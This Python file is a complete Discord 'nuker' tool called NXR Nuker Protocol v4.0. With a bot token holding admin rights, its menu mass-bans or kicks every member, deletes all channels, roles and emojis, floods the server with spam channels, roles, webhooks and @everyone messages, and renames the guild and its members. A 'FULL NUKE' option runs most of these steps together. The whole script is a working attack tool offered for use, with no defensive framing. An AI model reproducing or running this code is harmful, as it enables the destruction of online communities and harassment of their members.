# nxr_nuker_protocol.py
# NXR NUKER PROTOCOL v4.0 — full protocol
# Python 3.10+ | pip install aiohttp colorama pyyaml

import asyncio
import aiohttp
import json
import os
import re
import sys
import time
import random
import traceback
import unicodedata
from pathlib import Path

from colorama import init as cinit
cinit(autoreset=True)

try:
    import yaml
except ImportError:
    yaml = None

if os.name == "nt":
    os.system("")

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

DEFAULT_CONFIG = {
    "reason": "NXR",
    "concurrency": 6,
    "fetch_member_limit": 1000,
    "ban_delete_days": 1,
    "guild_rename": "NXR NUKED",
    "spam_channel_name": "nxr",
    "spam_channel_amount": 50,
    "spam_channel_type": 0,
    "spam_channel_concurrency": 3,
    "spam_role_name": "nxr",
    "spam_role_amount": 50,
    "spam_role_color": 0,
    "spam_message_content": "@everyone NXR",
    "spam_message_amount": 10,
    "spam_message_delay": 0.0,
    "spam_webhook_amount": 10,
    "nick_template": "NXR {n}",
    "slowmode_seconds": 21600,
    "gradient_start": [255, 45, 45],
    "gradient_end":   [165, 0, 255],
    "accent":  [255, 60, 90],
    "success": [90, 240, 150],
    "warn":    [255, 200, 60],
    "error":   [255, 70, 70],
    "muted":   [120, 120, 130],
    "truecolor": True,
}


def _load_yaml_overrides():
    if yaml is None:
        return {}
    base = Path(getattr(sys, "frozen", False) and Path(sys.executable).parent or Path(__file__).parent)
    p = base / "config.yml"
    if not p.exists():
        return {}
    try:
        with open(p, "r", encoding="utf-8") as f:
            loaded = yaml.safe_load(f) or {}
        flat = {}
        for k, v in loaded.items():
            if isinstance(v, dict):
                flat.update(v)
            else:
                flat[k] = v
        return flat
    except Exception:
        return {}


CFG = {**DEFAULT_CONFIG, **_load_yaml_overrides()}
C = lambda k: CFG[k]  # noqa: E731

TRUECOLOR = bool(CFG.get("truecolor", True))


def rgb(c, fb=37):
    if not TRUECOLOR:
        return f"\x1b[{fb}m"
    r, g, b = c
    return f"\x1b[38;2;{r};{g};{b}m"


RESET = "\x1b[0m"
BOLD = "\x1b[1m"
DIM = "\x1b[2m"

C_ACCENT = rgb(CFG["accent"])
C_OK = rgb(CFG["success"])
C_WARN = rgb(CFG["warn"])
C_ERR = rgb(CFG["error"])
C_MUTED = rgb(CFG["muted"])


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def grad(text, start=None, end=None):
    start = start or tuple(CFG["gradient_start"])
    end = end or tuple(CFG["gradient_end"])
    if not TRUECOLOR:
        return C_ACCENT + text + RESET
    chars = list(text)
    n = max(1, len(chars) - 1)
    out = []
    for i, ch in enumerate(chars):
        if ch == " ":
            out.append(ch)
            continue
        col = _lerp(start, end, i / n)
        out.append(f"\x1b[38;2;{col[0]};{col[1]};{col[2]}m{ch}")
    out.append(RESET)
    return "".join(out)


BANNER_ART = [
    r"  ███▄    █ ▒██   ██▒ ██▀███     ███▄    █ ██░ ██  ██▄▀",
    r"  ██ ▀█   █ ▒▒ █ █ ▒░▓██ ▒ ██▒   ██ ▀█   █▓██░ ██▒██▀▄",
    r" ▓██  ▀█ ██▒░░  █   ░▓██ ░▄█ ▒  ▓██  ▀█ ██▒▒██▀▀██░",
    r" ▓██▒  ▐▌██▒ ░ █ █ ▒ ▒██▀▀█▄    ▓██▒  ▐▌██▒░▓█ ░██",
    r" ▒██░   ▓██░▒██▒ ░ ░░██▓ ▒██▒  ▒██░   ▓██░░▓█▒░██▓",
]


def banner():
    print()
    for line in BANNER_ART:
        print(grad(line))
    sub = "N X R   N U K E R   P R O T O C O L"
    tag = "[ v4.0 - full protocol ]"
    pad = " " * max(0, (len(BANNER_ART[0]) - len(sub)) // 2)
    print()
    print(pad + grad(sub))
    print(" " * max(0, (len(BANNER_ART[0]) - len(tag)) // 2) + C_MUTED + tag + RESET)
    print()


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def log(tag, msg, color=C_ACCENT):
    ts = time.strftime("%H:%M:%S")
    print(f"{C_MUTED}[{ts}]{RESET} {color}{BOLD}[{tag}]{RESET} {msg}")


def prompt(msg, default=None):
    d = f" {C_MUTED}({default}){RESET}" if default is not None else ""
    try:
        val = input(f"{C_ACCENT}-> {RESET}{msg}{d}: ").strip()
    except EOFError:
        return default
    return val if val else default


def pause(msg="press ENTER to exit"):
    try:
        input(f"\n{C_MUTED}{msg}...{RESET}")
    except EOFError:
        pass


# ---------------------------------------------------------------
# TOKEN CLEANUP / DIAGNOSIS
# ---------------------------------------------------------------
def _clean(s):
    if s is None:
        return ""
    s = unicodedata.normalize("NFKC", s)
    s = s.replace("\u201c", "").replace("\u201d", "")
    s = s.replace("\u2018", "").replace("\u2019", "")
    s = "".join(ch for ch in s if ch.isprintable() or ch in " \t")
    s = re.sub(r"\s+", "", s)
    return s.strip().strip('"').strip("'")


def _diagnose_token(raw):
    s = _clean(raw)
    if not s:
        return s, "empty", "you didn't enter anything"
    low = s.lower()
    if low.startswith("bot"):
        s = s[3:].lstrip()
    elif low.startswith("bearer"):
        s = s[6:].lstrip()
    if re.fullmatch(r"\d{17,20}", s):
        return s, "bad_id", "that's the Application/Client ID, not the bot token"
    if re.fullmatch(r"[A-Za-z0-9_\-]{30,36}", s) and "." not in s:
        return s, "bad_secret", "that looks like a Client Secret"
    if re.fullmatch(r"[0-9a-fA-F]{64}", s):
        return s, "bad_public_key", "that's the Public Key"
    if s.count(".") == 2:
        parts = s.split(".")
        if len(parts[0]) >= 20 and len(parts[1]) >= 5 and len(parts[2]) >= 20:
            return s, "bot", ""
    if len(s) < 50:
        return s, "bad_short", f"token is only {len(s)} chars — bot tokens are ~70+"
    return s, "bad_chars", "unrecognized token shape"


def _mask(t):
    if len(t) <= 12:
        return t
    return t[:6] + "..." + t[-4:]


def _extract_guild_id(raw):
    s = _clean(raw).strip("<>#")
    digits = re.findall(r"\d{17,20}", s)
    return digits[0] if digits else s


async def _probe_token(cleaned):
    base = cleaned
    low = base.lower()
    if low.startswith("bot"):
        base = base[3:].lstrip()
    elif low.startswith("bearer"):
        base = base[6:].lstrip()

    attempts = [
        ("Bot " + base, "Bot <token>"),
        (base, "raw <token>"),
        ("Bearer " + base, "Bearer <token>"),
    ]

    last_status = None
    last_body = ""

    async with aiohttp.ClientSession() as s:
        for auth, label in attempts:
            headers = {"Authorization": auth, "User-Agent": UA}
            try:
                async with s.get(f"{API}/users/@me", headers=headers) as r:
                    if r.status == 200:
                        return auth, label, await r.json()
                    last_status = r.status
                    try:
                        last_body = await r.text()
                    except Exception:
                        last_body = ""
                    if r.status != 401:
                        break
            except Exception as e:
                last_status = "exception"
                last_body = f"{type(e).__name__}: {e}"

    return None, None, {"status": last_status, "body": last_body}


# ---------------------------------------------------------------
# CORE
# ---------------------------------------------------------------
class NXRNuker:
    def __init__(self, auth_header, guild_id):
        self.guild_id = str(guild_id).strip()
        self.headers = {
            "Authorization": auth_header,
            "User-Agent": UA,
            "Content-Type": "application/json",
        }
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(headers=self.headers)
        return self

    async def __aexit__(self, *a):
        await self.session.close()

    async def _req(self, method, path, **kwargs):
        url = f"{API}{path}"
        last_err = {"error": "unknown"}
        for _ in range(5):
            try:
                async with self.session.request(method, url, **kwargs) as r:
                    if r.status == 429:
                        try:
                            data = await r.json()
                        except Exception:
                            data = {}
                        await asyncio.sleep(float(data.get("retry_after", 2)) + 0.2)
                        continue
                    if r.status in (200, 201, 204):
                        try:
                            return await r.json()
                        except Exception:
                            return {}
                    body = ""
                    try:
                        body = await r.text()
                    except Exception:
                        pass
                    last_err = {"error": r.status, "text": body}
                    if r.status in (401, 403, 404):
                        return last_err
                    await asyncio.sleep(1)
            except Exception as e:
                last_err = {"error": "exception", "text": f"{type(e).__name__}: {e}"}
                await asyncio.sleep(1)
        return last_err

    # -- recon ---------------------------------------------------
    async def my_guilds(self):
        r = await self._req("GET", "/users/@me/guilds")
        return r if isinstance(r, list) else []

    async def fetch_guild(self):
        return await self._req("GET", f"/guilds/{self.guild_id}?with_counts=true")

    async def fetch_channels(self):
        r = await self._req("GET", f"/guilds/{self.guild_id}/channels")
        return r if isinstance(r, list) else []

    async def fetch_roles(self):
        r = await self._req("GET", f"/guilds/{self.guild_id}/roles")
        return r if isinstance(r, list) else []

    async def fetch_emojis(self):
        r = await self._req("GET", f"/guilds/{self.guild_id}/emojis")
        return r if isinstance(r, list) else []

    async def fetch_members(self, limit=1000):
        members, after = [], "0"
        while len(members) < limit:
            batch = await self._req(
                "GET", f"/guilds/{self.guild_id}/members?limit=1000&after={after}"
            )
            if not isinstance(batch, list) or not batch:
                break
            members.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000:
                break
            await asyncio.sleep(0.5)
        return members

    # -- bans ----------------------------------------------------
    async def ban_member(self, uid, reason, dd=0):
        return await self._req(
            "PUT", f"/guilds/{self.guild_id}/bans/{uid}",
            data=json.dumps({
                "delete_message_seconds": dd * 86400,
                "reason": reason,
            }),
        )

    async def ban_all(self, members, reason, dd, conc):
        sem = asyncio.Semaphore(conc)
        ok = fail = 0

        async def w(m):
            nonlocal ok, fail
            async with sem:
                r = await self.ban_member(m["user"]["id"], reason, dd)
                if "error" in r:
                    fail += 1
                else:
                    ok += 1
                    log("BAN", m["user"].get("username", "?"), C_ERR)

        await asyncio.gather(*(w(m) for m in members))
        return ok, fail

    # -- kicks ---------------------------------------------------
    async def kick_member(self, uid, reason):
        return await self._req(
            "DELETE", f"/guilds/{self.guild_id}/members/{uid}",
            data=json.dumps({"reason": reason}),
        )

    async def kick_all(self, members, reason, conc):
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(m):
            nonlocal ok
            async with sem:
                r = await self.kick_member(m["user"]["id"], reason)
                if "error" not in r:
                    ok += 1
                    log("KICK", m["user"].get("username", "?"), C_WARN)

        await asyncio.gather(*(w(m) for m in members))
        return ok

    # -- channels ------------------------------------------------
    async def delete_channel(self, cid):
        return await self._req("DELETE", f"/channels/{cid}")

    async def delete_all_channels(self, channels, conc):
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(c):
            nonlocal ok
            async with sem:
                r = await self.delete_channel(c["id"])
                if "error" not in r:
                    ok += 1
                    log("DEL", f"#{c.get('name','?')}", C_ACCENT)

        await asyncio.gather(*(w(c) for c in channels))
        return ok

    async def create_channel(self, name, ctype=0):
        return await self._req(
            "POST", f"/guilds/{self.guild_id}/channels",
            data=json.dumps({"name": name, "type": ctype}),
        )

    async def spam_channels(self, name, amount, ctype, conc):
        sem = asyncio.Semaphore(conc)

        async def w(i):
            async with sem:
                n = f"{name}-{i}" if amount > 1 else name
                r = await self.create_channel(n, ctype)
                if "error" not in r:
                    log("MAKE", n, C_OK)

        await asyncio.gather(*(w(i) for i in range(amount)))

    # -- roles ---------------------------------------------------
    async def delete_role(self, rid):
        return await self._req("DELETE", f"/guilds/{self.guild_id}/roles/{rid}")

    async def delete_all_roles(self, roles, conc):
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(r):
            nonlocal ok
            if r.get("managed") or r["name"] == "@everyone":
                return
            async with sem:
                res = await self.delete_role(r["id"])
                if "error" not in res:
                    ok += 1
                    log("ROLE-", r["name"], C_ACCENT)

        await asyncio.gather(*(w(r) for r in roles))
        return ok

    async def create_role(self, name, color=0, hoist=False, mentionable=False):
        return await self._req(
            "POST", f"/guilds/{self.guild_id}/roles",
            data=json.dumps({
                "name": name, "color": color,
                "hoist": hoist, "mentionable": mentionable,
            }),
        )

    async def spam_roles(self, name, amount, color, conc=3):
        sem = asyncio.Semaphore(conc)

        async def w(i):
            async with sem:
                n = f"{name}-{i}" if amount > 1 else name
                r = await self.create_role(n, color)
                if "error" not in r:
                    log("ROLE+", n, C_OK)

        await asyncio.gather(*(w(i) for i in range(amount)))

    # -- messages ------------------------------------------------
    async def send_message(self, cid, content):
        return await self._req(
            "POST", f"/channels/{cid}/messages",
            data=json.dumps({"content": content}),
        )

    async def spam_messages(self, cid, content, amount, delay=0.0):
        sent = 0
        for _ in range(amount):
            r = await self.send_message(cid, content)
            if "error" not in r:
                sent += 1
            if delay:
                await asyncio.sleep(delay)
        log("MSG", f"{sent}/{amount} -> {cid}", C_OK)
        return sent

    async def spam_all_channels(self, channels, content, amount, delay):
        text = [c for c in channels if c.get("type") == 0]
        for t in text:
            await self.spam_messages(t["id"], content, amount, delay)

    # -- slowmode ------------------------------------------------
    async def slowmode_channel(self, cid, seconds):
        return await self._req(
            "PATCH", f"/channels/{cid}",
            data=json.dumps({"rate_limit_per_user": seconds}),
        )

    async def slowmode_all(self, channels, seconds, conc=5):
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(c):
            nonlocal ok
            if c.get("type") != 0:
                return
            async with sem:
                r = await self.slowmode_channel(c["id"], seconds)
                if "error" not in r:
                    ok += 1

        await asyncio.gather(*(w(c) for c in channels))
        return ok

    # -- webhooks ------------------------------------------------
    async def create_webhook(self, cid, name="NXR"):
        return await self._req(
            "POST", f"/channels/{cid}/webhooks",
            data=json.dumps({"name": name}),
        )

    async def spam_webhooks(self, channels, amount, conc=3):
        text = [c for c in channels if c.get("type") == 0]
        if not text:
            return 0
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(i):
            nonlocal ok
            async with sem:
                ch = random.choice(text)
                r = await self.create_webhook(ch["id"], f"NXR-{i}")
                if "error" not in r:
                    ok += 1
                    log("HOOK", f"NXR-{i}", C_OK)

        await asyncio.gather(*(w(i) for i in range(amount)))
        return ok

    # -- nicknames -----------------------------------------------
    async def set_nick(self, uid, nick):
        return await self._req(
            "PATCH", f"/guilds/{self.guild_id}/members/{uid}",
            data=json.dumps({"nick": nick}),
        )

    async def mass_nick(self, members, template, conc=5):
        sem = asyncio.Semaphore(conc)
        ok = 0

        async def w(i, m):
            nonlocal ok
            nick = template.replace("{n}", str(i))
            async with sem:
                r = await self.set_nick(m["user"]["id"], nick)
                if "error" not in r:
                    ok += 1

        await asyncio.gather(*(w(i, m) for i, m in enumerate(members)))
        log("NICK", f"{ok}/{len(members)} renamed", C_OK)
        return ok

    # -- guild edit ----------------------------------------------
    async def rename_guild(self, name):
        return await self._req(
            "PATCH", f"/guilds/{self.guild_id}",
            data=json.dumps({"name": name}),
        )

    async def delete_emojis(self, emojis):
        for e in emojis:
            await self._req("DELETE", f"/guilds/{self.guild_id}/emojis/{e['id']}")
            log("EMOJI-", e.get("name", "?"), C_ACCENT)


# ---------------------------------------------------------------
# UI
# ---------------------------------------------------------------
W = 52


def box_line():
    return grad("+" + "-" * W + "+")


def draw_menu():
    print()
    print(box_line())
    pad = (W - 35) // 2
    print(grad("|") + " " * pad + grad("N X R   N U K E R   P R O T O C O L") + " " * (W - 35 - pad) + grad("|"))
    print(box_line())
    items = [
        ("1",  "Ban All Members"),
        ("2",  "Kick All Members"),
        ("3",  "Delete All Channels"),
        ("4",  "Spam Channels"),
        ("5",  "Delete All Roles"),
        ("6",  "Spam Roles"),
        ("7",  "Spam Messages"),
        ("8",  "Rename Guild"),
        ("9",  "Delete All Emojis"),
        ("10", "Mass Nickname Change"),
        ("11", "Slowmode All Channels"),
        ("12", "Spam Webhooks"),
        ("13", "List My Bot's Guilds"),
        ("14", "FULL NUKE"),
        ("0",  "Exit"),
    ]
    for k, label in items:
        num = f"{C_ACCENT}[{k:>2}]{RESET}"
        visible = len(f"|  [{k:>2}]  {label}")
        pad_r = " " * max(1, (W + 2) - visible - 1)
        print(f"|  {num}  {label}{pad_r}" + grad("|"))
    print(box_line())
    print()


def header(txt):
    print()
    print(grad(f"-- {txt} " + "-" * max(0, 46 - len(txt))))


# ---------------------------------------------------------------
# ACTIONS
# ---------------------------------------------------------------
async def act_ban(n):
    header("BAN ALL MEMBERS")
    reason = prompt("reason", C("reason"))
    try:
        dd = int(prompt("delete msg days (0-7)", str(C("ban_delete_days"))) or 0)
        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
    except ValueError:
        dd, conc = 0, 6
    log("SCAN", "fetching members...", C_WARN)
    members = await n.fetch_members(C("fetch_member_limit"))
    log("SCAN", f"{len(members)} members", C_WARN)
    ok, fail = await n.ban_all(members, reason, dd, conc)
    log("DONE", f"banned {ok}  failed {fail}", C_OK)


async def act_kick(n):
    header("KICK ALL MEMBERS")
    reason = prompt("reason", C("reason"))
    try:
        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
    except ValueError:
        conc = 6
    members = await n.fetch_members(C("fetch_member_limit"))
    log("SCAN", f"{len(members)} members", C_WARN)
    ok = await n.kick_all(members, reason, conc)
    log("DONE", f"kicked {ok}", C_OK)


async def act_del_chans(n):
    header("DELETE ALL CHANNELS")
    try:
        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
    except ValueError:
        conc = 6
    chans = await n.fetch_channels()
    log("SCAN", f"{len(chans)} channels", C_WARN)
    ok = await n.delete_all_channels(chans, conc)
    log("DONE", f"deleted {ok}", C_OK)


async def act_spam_chans(n):
    header("SPAM CHANNELS")
    name = prompt("channel name", C("spam_channel_name"))
    try:
        amt = int(prompt("amount", str(C("spam_channel_amount"))) or 50)
        ctype = int(prompt("type 0=text 2=voice", str(C("spam_channel_type"))) or 0)
        conc = int(prompt("concurrency", str(C("spam_channel_concurrency"))) or 3)
    except ValueError:
        amt, ctype, conc = 50, 0, 3
    await n.spam_channels(name, amt, ctype, conc)
    log("DONE", "channel spam complete", C_OK)


async def act_del_roles(n):
    header("DELETE ALL ROLES")
    try:
        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
    except ValueError:
        conc = 6
    roles = await n.fetch_roles()
    ok = await n.delete_all_roles(roles, conc)
    log("DONE", f"deleted {ok} roles", C_OK)


async def act_spam_roles(n):
    header("SPAM ROLES")
    name = prompt("role name", C("spam_role_name"))
    try:
        amt = int(prompt("amount", str(C("spam_role_amount"))) or 50)
        col = int(prompt("color int (0 = none)", str(C("spam_role_color"))) or 0)
    except ValueError:
        amt, col = 50, 0
    await n.spam_roles(name, amt, col)
    log("DONE", "role spam complete", C_OK)


async def act_spam_msgs(n):
    header("SPAM MESSAGES")
    chans = await n.fetch_channels()
    text = [c for c in chans if c.get("type") == 0]
    print(f"  {C_MUTED}text channels: {len(text)}{RESET}")
    cid = prompt("channel id (or 'all')", "all")
    content = prompt("message", C("spam_message_content"))
    try:
        amt = int(prompt("messages per channel", str(C("spam_message_amount"))) or 10)
        delay = float(prompt("delay (s)", str(C("spam_message_delay"))) or 0)
    except ValueError:
        amt, delay = 10, 0.0
    if cid == "all":
        await n.spam_all_channels(chans, content, amt, delay)
    else:
        await n.spam_messages(cid, content, amt, delay)
    log("DONE", "message spam complete", C_OK)


async def act_rename(n):
    header("RENAME GUILD")
    name = prompt("new guild name", C("guild_rename"))
    await n.rename_guild(name)
    log("DONE", f"renamed -> {name}", C_OK)


async def act_del_emojis(n):
    header("DELETE ALL EMOJIS")
    emojis = await n.fetch_emojis()
    log("SCAN", f"{len(emojis)} emojis", C_WARN)
    if emojis:
        await n.delete_emojis(emojis)
    log("DONE", "emojis cleared", C_OK)


async def act_nick(n):
    header("MASS NICKNAME CHANGE")
    tmpl = prompt("nick template ({n} = index)", C("nick_template"))
    try:
        conc = int(prompt("concurrency", "5") or 5)
    except ValueError:
        conc = 5
    members = await n.fetch_members(C("fetch_member_limit"))
    log("SCAN", f"{len(members)} members", C_WARN)
    await n.mass_nick(members, tmpl, conc)


async def act_slowmode(n):
    header("SLOWMODE ALL CHANNELS")
    try:
        sec = int(prompt("slowmode seconds", str(C("slowmode_seconds"))) or 21600)
        conc = int(prompt("concurrency", "5") or 5)
    except ValueError:
        sec, conc = 21600, 5
    chans = await n.fetch_channels()
    ok = await n.slowmode_all(chans, sec, conc)
    log("DONE", f"{ok} channels set to {sec}s", C_OK)


async def act_webhooks(n):
    header("SPAM WEBHOOKS")
    try:
        amt = int(prompt("amount", str(C("spam_webhook_amount"))) or 10)
        conc = int(prompt("concurrency", "3") or 3)
    except ValueError:
        amt, conc = 10, 3
    chans = await n.fetch_channels()
    ok = await n.spam_webhooks(chans, amt, conc)
    log("DONE", f"created {ok} webhooks", C_OK)


async def act_list_guilds(n):
    header("MY BOT'S GUILDS")
    gs = await n.my_guilds()
    if not gs:
        log("ERR", "bot is not in any guilds — invite it first", C_ERR)
        return
    print(f"  {C_MUTED}bot is in {len(gs)} guild(s):{RESET}")
    print()
    for g in gs:
        gid = g.get("id", "?")
        name = g.get("name", "?")
        perms = int(g.get("permissions", 0))
        admin = "ADMIN" if perms & 0x8 else "     "
        print(f"  {C_ACCENT}{gid}{RESET}  {C_MUTED}{admin}{RESET}  {name}")
    print()
    log("HINT", "copy an id above and re-run the tool with it", C_WARN)


async def act_full_nuke(n):
    header("FULL NUKE")
    reason = prompt("ban reason", C("reason"))
    try:
        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
    except ValueError:
        conc = 6
    log("NUKE", "recon...", C_ERR)
    members, chans, roles = await asyncio.gather(
        n.fetch_members(C("fetch_member_limit")),
        n.fetch_channels(),
        n.fetch_roles(),
    )
    log("NUKE", f"{len(members)}M  {len(chans)}C  {len(roles)}R", C_ERR)

    await asyncio.gather(
        n.ban_all(members, reason, C("ban_delete_days"), conc),
        n.delete_all_channels(chans, conc),
        n.delete_all_roles(roles, conc),
    )
    await n.rename_guild(C("guild_rename"))
    await n.spam_channels(C("spam_channel_name"), C("spam_channel_amount"), 0, 3)
    await n.spam_roles(C("spam_role_name"), C("spam_role_amount"), 0, 3)
    await n.spam_webhooks(await n.fetch_channels(), C("spam_webhook_amount"), 3)
    log("DONE", "full nuke complete", C_OK)


ACTIONS = {
    "1": act_ban,
    "2": act_kick,
    "3": act_del_chans,
    "4": act_spam_chans,
    "5": act_del_roles,
    "6": act_spam_roles,
    "7": act_spam_msgs,
    "8": act_rename,
    "9": act_del_emojis,
    "10": act_nick,
    "11": act_slowmode,
    "12": act_webhooks,
    "13": act_list_guilds,
    "14": act_full_nuke,
}


async def menu(n):
    while True:
        draw_menu()
        c = prompt("select", "0")
        if c == "0":
            print(f"\n{C_MUTED}exiting.{RESET}")
            return
        fn = ACTIONS.get(c)
        if not fn:
            log("ERR", "unknown option", C_ERR)
            continue
        try:
            await fn(n)
        except Exception as e:
            log("ERR", f"{type(e).__name__}: {e}", C_ERR)
            traceback.print_exc()


async def run():
    clear()
    banner()

    token_raw = prompt("bot token")
    gid_raw = prompt("guild id")

    if not token_raw or not gid_raw:
        log("ERR", "token and guild id required", C_ERR)
        return

    cleaned, kind, hint = _diagnose_token(token_raw)
    gid = _extract_guild_id(gid_raw)

    print()
    log("INPUT", f"token length: {len(cleaned)}  |  preview: {_mask(cleaned)}", C_MUTED)
    log("INPUT", f"guild id: {gid}", C_MUTED)
    print()

    if kind == "empty":
        log("ERR", "token is empty after cleanup", C_ERR)
        return
    if kind in ("bad_id", "bad_secret", "bad_public_key", "bad_short"):
        log("ERR", hint, C_ERR)
        log("HINT", "dev portal > Bot > Reset Token > Copy. paste THAT.", C_WARN)
        return

    log("AUTH", "checking token...", C_WARN)

    auth, label, result = await _probe_token(cleaned)

    if not auth:
        log("ERR", "invalid token (401) in every format tried", C_ERR)
        status = result.get("status") if isinstance(result, dict) else None
        if status == 401:
            log("HINT", "dev portal > Bot > Reset Token > Copy. paste that whole string.", C_WARN)
            log("HINT", "should be ~70 chars, three parts separated by dots.", C_WARN)
        return

    log("AUTH", f"format accepted: {label}", C_OK)
    log("OK", f"logged in as {result.get('username','?')}#{result.get('discriminator','0')} (id {result.get('id','?')})", C_OK)

    async with NXRNuker(auth, gid) as n:
        info = await n.fetch_guild()
        if "error" in info:
            code = info.get("error")
            if code == 403:
                log("ERR", f"no access to guild {gid} (403)", C_ERR)
                log("CAUSE", "the bot is NOT in this guild yet", C_WARN)
                log("FIX", "invite the bot: dev portal > OAuth2 > URL Generator", C_WARN)
                log("FIX", "scopes: bot + applications.commands | perms: Administrator", C_WARN)
                log("FIX", "paste the generated URL in a browser, pick server, authorize", C_WARN)
                print()
                log("CHECK", "listing guilds the bot IS in...", C_WARN)
                gs = await n.my_guilds()
                if gs:
                    print()
                    for g in gs:
                        print(f"  {C_ACCENT}{g.get('id')}{RESET}  {g.get('name')}")
                    print()
                    log("HINT", "use one of the ids above next time", C_WARN)
                else:
                    log("ERR", "bot is not in any guilds", C_ERR)
                return
            if code == 404:
                log("ERR", f"guild {gid} not found — wrong id or bot not invited", C_ERR)
            else:
                log("ERR", f"guild fetch failed: {code} {info.get('text','')[:120]}", C_ERR)
            return

        log("OK", f"{info['name']}  |  {info.get('approximate_member_count','?')} members", C_OK)
        await menu(n)


async def _main_async():
    try:
        await run()
    except aiohttp.ClientConnectorError:
        log("ERR", "network error — check your internet / dns", C_ERR)
    except asyncio.TimeoutError:
        log("ERR", "request timed out", C_ERR)
    except Exception as e:
        log("ERR", f"{type(e).__name__}: {e}", C_ERR)
        traceback.print_exc()


def main():
    try:
        asyncio.run(_main_async())
    except KeyboardInterrupt:
        print(f"\n{C_ERR}aborted.{RESET}")
    except Exception:
        traceback.print_exc()
    finally:
        pause()


if __name__ == "__main__":
    main()
